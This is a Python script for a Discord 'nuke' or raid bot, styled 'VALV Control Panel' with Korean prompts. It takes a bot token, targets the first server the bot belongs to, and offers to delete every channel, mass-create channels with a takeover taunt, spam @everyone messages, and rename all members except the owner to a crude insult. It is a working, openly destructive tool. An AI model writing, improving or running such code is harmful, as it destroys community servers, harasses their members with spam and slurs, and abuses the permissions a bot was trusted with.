import os
import asyncio
import discord

# 터미널 화면 청소
os.system('cls' if os.name == 'nt' else 'clear')

# 왼쪽 위에 그라데이션으로 표시될 VALV 타이틀 배너
def print_banner():
    banner = """
\033[1;36m██      ██  █████  ██      ██    ██ \033[0m
\033[1;34m██      ██ ██   ██ ██      ██    ██ \033[0m
\033[1;35m██  ██  ██ ███████ ██      ██    ██ \033[0m
\033[1;31m ████ ████ ██   ██ ███████  ██████  \033[0m
    """
    print(banner)
    print("\033[1;33m[+] VALV Control Panel Initialized\033[0m\n")

print_banner()

# 다른 것보다 먼저 봇 토큰 입력창을 띄움
TOKEN = input("\033[1;32m[?] Discord Bot Token 입력: \033[0m").strip()

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.members = True
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"\n\033[1;32m[LOG] 접속 성공: {client.user} (ID: {client.user.id})\033[0m")
    print("\033[1;34m[LOG] 봇이 활성화되었습니다. 아래 메뉴에서 작업을 선택하세요.\033[0m\n")
    
    print("=" * 40)
    print(" [1] 모든 채널 삭제")
    print(" [2] 채널 생성")
    print(" [3] 메시지 전송")
    print(" [4] 모든 사람 닉네임 변경")
    print("=" * 40)
    
    choice = input("\033[1;33m[?] 숫자를 입력하고 엔터를 누르세요: \033[0m").strip()
    
    if not client.guilds:
        print("\033[1;31m[LOG] 오류: 봇이 속한 서버가 없습니다!\033[0m")
        await client.close()
        return
        
    guild = client.guilds[0]
    print(f"\033[1;32m[LOG] 대상 서버 선택됨: {guild.name}\033[0m")

    # [1] 모든 채널 삭제
    if choice == '1':
        print("\033[1;31m[LOG] 모든 채널 삭제 작업 시작...\033[0m")
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"\033[1;31m[LOG] 삭제됨: {channel.name}\033[0m")
            except Exception as e:
                print(f"\033[1;31m[LOG] 삭제 실패 ({channel.name}): {e}\033[0m")
        print("\033[1;32m[LOG] 모든 채널 삭제 완료.\033[0m")

    # [2] 채널 생성
    elif choice == '2':
        count_input = input("\033[1;33m[?] 생성할 채널 개수 입력: \033[0m").strip()
        if count_input.isdigit():
            count = int(count_input)
            channel_name = "발브가 점령함 ㅋㅋㅋ,발브를 찬양해!!"
            print(f"\033[1;35m[LOG] 총 {count}개의 채널 생성 시작...\033[0m")
            for i in range(count):
                try:
                    await guild.create_text_channel(channel_name)
                    print(f"\033[1;35m[LOG] 생성 완료 ({i+1}/{count}): {channel_name}\033[0m")
                except Exception as e:
                    print(f"\033[1;31m[LOG] 생성 실패: {e}\033[0m")
            print("\033[1;32m[LOG] 채널 생성 작업 완료.\033[0m")
        else:
            print("\033[1;31m[LOG] 잘못된 숫자 입력입니다.\033[0m")

    # [3] 메시지 전송
    elif choice == '3':
        count_input = input("\033[1;33m[?] 메시지 전송 횟수 입력: \033[0m").strip()
        if count_input.isdigit():
            count = int(count_input)
            message_content = "@everyone 발브가 점령함 ㅋㅋㅋ,@everyone 그니까 발브를 믿으라고 ㅋㅋㅋ"
            print(f"\033[1;36m[LOG] 메시지 전송 작업 시작 (총 {count}회)...\033[0m")
            
            text_channels = [c for c in guild.text_channels]
            if not text_channels:
                print("\033[1;31m[LOG] 전송 가능한 텍스트 채널이 없습니다.\033[0m")
            else:
                target_channel = text_channels[0]
                for i in range(count):
                    try:
                        await target_channel.send(message_content)
                        print(f"\033[1;36m[LOG] 메시지 전송됨 ({i+1}/{count}) -> #{target_channel.name}\033[0m")
                        await asyncio.sleep(0.4)
                    except Exception as e:
                        print(f"\033[1;31m[LOG] 전송 실패: {e}\033[0m")
                print("\033[1;32m[LOG] 메시지 전송 작업 완료.\033[0m")
        else:
            print("\033[1;31m[LOG] 잘못된 숫자 입력입니다.\033[0m")

    # [4] 모든 사람 닉네임 변경
    elif choice == '4':
        new_nickname = "발브 따까리 년들"
        print(f"\033[1;31m[LOG] 모든 멤버 닉네임 변경 시작 ('{new_nickname}')...\033[0m")
        async for member in guild.fetch_members(limit=None):
            if member == guild.owner:
                print(f"\033[1;33m[LOG] 서버 소유자는 건너뜁니다: {member.name}\033[0m")
                continue
            try:
                await member.edit(nick=new_nickname)
                print(f"\033[1;32m[LOG] 닉네임 변경 완료: {member.name} -> {new_nickname}\033[0m")
            except Exception as e:
                print(f"\033[1;31m[LOG] 닉네임 변경 실패 ({member.name}): {e}\033[0m")
        print("\033[1;32m[LOG] 닉네임 변경 작업 완료.\033[0m")

    else:
        print("\033[1;31m[LOG] 존재하지 않는 번호입니다.\033[0m")

    print("\n\033[1;32m[LOG] 모든 작업이 종료되었습니다.\033[0m")
    await client.close()

client.run(TOKEN)
